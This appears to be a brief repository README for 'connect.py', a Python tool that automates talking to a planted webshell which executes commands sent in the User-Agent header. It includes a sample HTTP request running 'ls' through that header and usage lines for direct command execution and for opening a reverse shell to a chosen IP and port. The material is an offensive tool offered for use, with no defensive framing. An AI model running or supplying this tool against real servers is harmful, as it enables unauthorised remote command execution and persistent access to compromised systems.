This tool was created for automate process of make connections to  webshell by header

for example, when there is a page webshell.php and the Header <b>User-Agent</b> is accepting 
code execution in the server 

and you can execute commands as in the example:

<br>
GET /webshell.php HTTP/1.1<br>
<b>User-Agent: ls </b> <br>
Host: example.com <br>
Accept-Language: en-us <br>
Accept-Encoding: gzip, deflate <br>
Connection: Keep-Alive <br>




<h1>How to use</h1>

<b>default connection:</b>

python3 connect.py [webpage] [Argument]

<b>Reverse Shell connection:</b>

python3 connect.py [webpage] [Argument] [reverse_shell_ip] [reverse_shell_port]

